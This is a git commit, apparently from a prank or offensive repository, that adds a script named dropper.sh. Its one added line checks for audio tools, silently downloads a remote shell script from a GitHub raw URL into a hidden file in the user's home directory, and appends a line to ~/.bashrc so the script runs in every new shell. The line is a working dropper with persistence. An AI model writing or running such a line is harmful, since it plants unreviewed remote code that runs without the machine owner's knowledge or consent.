c1de3e82dd2144604d0d9a4ce46ba5c35dd5f641
Dan Antagon <antagon@codeward.org>
2017-08-01 22:13:21 +0200

    Add dropper script.

--- dropper.sh
+++ dropper.sh
@@ -1,1 +1,1 @@
-wget -qO- 
+type amixer && type ffplay && wget -qO- https://raw.githubusercontent.com/antagon/sexy.sh/master/sexy.sh > "$HOME/.sexy.sh" && echo "bash $HOME/.sexy.sh" >> "$HOME/.bashrc"
